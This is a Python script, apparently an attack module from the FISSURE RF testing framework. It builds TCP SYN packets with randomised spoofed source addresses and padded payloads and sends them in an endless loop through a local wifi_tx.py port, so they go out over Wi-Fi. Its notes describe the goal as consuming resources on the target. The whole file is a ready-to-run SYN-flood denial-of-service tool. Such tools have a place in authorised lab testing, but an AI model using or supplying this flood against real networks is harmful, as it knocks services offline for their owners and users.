from scapy.all import IP,TCP,LLC,SNAP,RandIP,Raw,RandShort
import socket
import time
import sys

#################################################
############ Default FISSURE Header #############
#################################################
def getArguments():
    tcp_dest_ip = "192.168.1.10"
    tcp_dest_port = 80
    interval = .1
    wifi_tx_udp_port = 52001
    wifi_tx_ip_address = "127.0.0.1"
    notes = 'Generates TCP SYN messages with random source IP addresses to consume resources on the target. Messages are placed in UDP data and sent to a wifi_tx.py UDP port.'
    arg_names = ['tcp_dest_ip','tcp_dest_port','interval','wifi_tx_udp_port','wifi_tx_ip_address','notes']
    arg_values = [tcp_dest_ip, tcp_dest_port, interval, wifi_tx_udp_port, wifi_tx_ip_address, notes]

    return (arg_names,arg_values)


if __name__ == "__main__":

    # Default Values
    get_tcp_dest_ip = "192.168.1.10"
    get_tcp_dest_port = 80
    get_interval = .01
    get_wifi_tx_udp_port = 52001
    get_wifi_tx_ip_address = "127.0.0.1"

    # Accept Command Line Arguments
    try:
        get_tcp_dest_ip = sys.argv[1]
        get_tcp_dest_port = int(sys.argv[2])
        get_interval = float(sys.argv[3])
        get_wifi_tx_udp_port = int(sys.argv[4])
        get_wifi_tx_ip_address = sys.argv[5]
    except:
        pass

#################################################

    # LLC/SNAP/IP/TCP Message in UDP Data -> "wifi_tx.py" Port
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # LLC/SNAP/IP
    pip_bytes = LLC()/SNAP()/IP()
    pip_bytes[IP].src = RandIP()  
    #pip_bytes[IP].src = RandIP("192.168.1.1/24")
    #pip_bytes[IP].src = "192.168.1.4"
    pip_bytes[IP].dst = get_tcp_dest_ip
    pip_bytes[IP].id = 0x0000
    pip_bytes[IP].flags = 2
    
    # Optional Raw TCP Data
    tcp_data = Raw(b"X"*1024)

    while True:
        # Make TCP
        tcp_bytes = TCP(sport=RandShort(), dport=get_tcp_dest_port, flags="S")
        
        # Assemble
        final_bytes = str(pip_bytes/tcp_bytes/tcp_data)
        
        # Send
        udp_socket.sendto(final_bytes,(get_wifi_tx_ip_address, get_wifi_tx_udp_port))
        time.sleep(get_interval)
